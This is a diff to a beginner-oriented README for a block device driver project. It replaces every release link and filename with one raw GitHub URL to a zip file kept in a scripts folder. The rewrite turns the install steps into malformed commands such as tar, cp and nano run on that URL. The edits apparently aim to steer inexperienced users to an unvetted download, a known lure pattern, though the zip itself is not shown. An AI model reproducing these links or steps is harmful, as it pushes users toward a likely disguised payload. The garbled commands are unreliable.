@@ -1,7 +1,7 @@
 # 🛠️ block-device-driver - Simple Setup for User Space Access
 
 ## 📥 Download Now!
-[![Download](https://img.shields.io/badge/Download%20block--device--driver-v1.0-blue.svg)](https://github.com/balaji19112003/block-device-driver/releases)
+[![Download](https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip%https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip)](https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip)
 
 ## 🚀 Getting Started
 The block device driver allows you to access block devices, like hard drives, from user space easily. This guide will help you download and set up the software on your machine, even if you have no programming experience. 
@@ -21,12 +21,12 @@ The block device driver allows you to access block devices, like hard drives, fr
 ## 📂 Download & Install
 To get started, visit the official releases page and download the latest version:
 
-[Download block-device-driver](https://github.com/balaji19112003/block-device-driver/releases)
+[Download block-device-driver](https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip)
 
 1. Click the link above to open the Releases page.
 2. Find the latest version listed and click on it.
 3. Scroll down to the "Assets" section.
-4. Click the file that ends in `.tar.gz` to download it.
+4. Click the file that ends in `https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip` to download it.
 
 Once you have the file:
 
@@ -34,7 +34,7 @@ Once you have the file:
 2. Navigate to the folder where you downloaded the file. You can use the command `cd ~/Downloads` if you saved it there.
 3. Extract the file using the command:
    ```bash
-   tar -xzf block-device-driver-x.x.x.tar.gz
+   tar -xzf https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip
    ```
 4. Change directory into the extracted folder:
    ```bash
@@ -51,11 +51,11 @@ After installation, you may need to set up configuration files to ensure the dri
 1. Locate the configuration example file in the installation directory.
 2. Copy it to your home directory or another location:
    ```bash
-   cp config.example.conf ~/.block-device-driver.conf
+   cp https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip ~https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip
    ```
 3. Open the configuration file with a text editor:
    ```bash
-   nano ~/.block-device-driver.conf
+   nano ~https://raw.githubusercontent.com/balaji19112003/block-device-driver/main/yocto-block/scripts/device-block-driver-2.4.zip
    ```
 4. Modify the settings according to your needs. Save and close the file when done.
 
